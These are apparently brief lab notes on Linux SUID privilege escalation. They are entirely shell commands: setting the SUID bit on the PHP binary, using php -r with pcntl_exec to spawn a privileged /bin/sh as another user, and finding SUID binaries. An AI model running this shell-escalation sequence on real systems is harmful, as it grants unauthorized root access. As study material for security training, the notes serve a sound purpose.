### suid
```bash
which base64 | xargs ls -l

apt install php
which php
which php | xargs ls -l

ls -l /etc/alternatives/php
ls -l /usr/bin/php8.3

chmod u+s /usr/bin/php8.3

su s4vitar
php -r "pcntl_exec('/bin/sh', ['-p']);"
bash -p

# root

find / -perm -4000 2>/dev/null


```